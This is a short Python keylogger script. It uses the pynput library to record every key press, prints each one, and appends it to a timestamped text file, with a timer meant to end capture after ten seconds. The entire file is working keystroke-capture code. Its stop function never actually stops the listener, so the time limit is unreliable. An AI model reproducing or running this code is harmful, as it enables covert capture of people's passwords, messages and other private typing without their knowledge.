from pynput import keyboard
from threading import Timer
import datetime



def get_char(key):
    try:
        return key.char
    except AttributeError:
        return str(key)

def on_press(key):
    print(key)
    if str(key) == "Key.enter":
        key = "[ENTER]\n"
    with open(filename, 'a') as logs:
        logs.write(get_char(key))

def stop_logging():
    print("Exiting keylogger...")
    global listener
    del listener
    return


def start_keylogger():
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    global filename
    filename = f"keylogs_{timestamp}.txt"
    global listener
    listener = keyboard.Listener(
        on_press=on_press,
    )
    timer = Timer(10, stop_logging)
    timer.start()
    listener.start()

    




